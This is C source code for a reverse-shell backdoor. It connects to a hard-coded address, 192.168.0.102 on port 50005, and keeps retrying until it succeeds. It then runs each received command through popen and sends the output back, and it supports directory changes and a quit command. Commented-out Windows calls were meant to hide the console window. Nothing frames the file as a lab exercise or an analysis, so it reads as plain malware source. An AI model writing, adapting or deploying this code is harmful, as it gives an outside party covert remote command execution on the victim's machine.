#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int sock;

void Shell()
{
	//printf("Inside Shell\n");
	char buffer[1024];
	char prev_dir[1024];
	char cwd[1024];
	char container[1024];
	char total_response[18384];
	memset(&prev_dir, '\0', sizeof(prev_dir));

	while(1)
	{
		memset(&buffer, '\0', sizeof(buffer));
		memset(&container, '\0', sizeof(container));
		memset(&total_response, '\0', sizeof(total_response));

		recv(sock, buffer, sizeof(buffer), 0);
		printf("%s\n", buffer);

		if(strncmp("q", buffer, 1) == 0)
		{
			close(sock);
			//WSACleanup();
			exit(0);
		}
		else if(strncmp("cd ", buffer, 3) == 0)
		{
			//char ret[20];
			//memset(&ret, '\0', sizeof(ret));
			memset(&cwd, '\0', sizeof(cwd));
			//strncpy(dir, buffer, 1024);
			char* dir = buffer+3;
			printf("cwd: %s\n", getcwd(cwd, sizeof(cwd)));

			if(strncmp(dir, "-", 1)==0)
				dir = prev_dir;

			printf("dir: %s\n", dir);
			memset(&prev_dir, '\0', sizeof(prev_dir));
			strncpy(prev_dir, getcwd(cwd, sizeof(cwd)), sizeof(cwd));

			if(dir == NULL || chdir(dir) != 0)
				strncpy(total_response, "chdir failed\n", 13);
			else {
				strncpy(total_response, "chdir success\n", 14);
			}

			//prev_dir = getcwd(cwd, sizeof(cwd));
			//strncpy(prev_dir, cur_dir, strlen(cur_dir));
			//printf("ret: %s\n", ret);
			printf("cwd: %s\n", getcwd(cwd, sizeof(cwd)));
			//send(sock, ret, sizeof(ret), 0);
			send(sock, total_response, sizeof(total_response), 0);
		}
		else
		{
			//printf("1\n");
			FILE* fp;
			fp = popen(buffer, "r");
			//printf("2\n");
			//system(buffer);
			while(fgets(container, 1024, fp) != NULL)
			{
				//printf("3\n");
				strcat(total_response, container);
				//printf("%s\n", total_response);
			}
			//printf("4\n");
			send(sock, total_response, sizeof(total_response), 0);
			//printf("5\n");
			pclose(fp);
		}
	}
}


int main()
{
	//HWND stealth;
	//AllocConsole();
	//stealth = FindWindowA("ConsoleWindowClass", NULL);

	//ShowWindow(stealth, 0);

	struct sockaddr_in server_addr;
	unsigned short server_port;
	char* server_ip;
	//WSADATA wsaData;

	server_ip = "192.168.0.102";
	server_port = 50005;

	//if(WSAStartup(MAKEWORD(2,0), &wsaData) != 0)
	//	exit(1);

	sock = socket(AF_INET, SOCK_STREAM, 0);

	memset(&server_addr, 0, sizeof(server_addr));
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.s_addr = inet_addr(server_ip);
	server_addr.sin_port = htons(server_port);

//start:
	while(connect(sock, (struct sockaddr*) &server_addr, sizeof(server_addr)) != 0)
	{
		sleep(10);
		//goto start;
	}
	Shell();
}
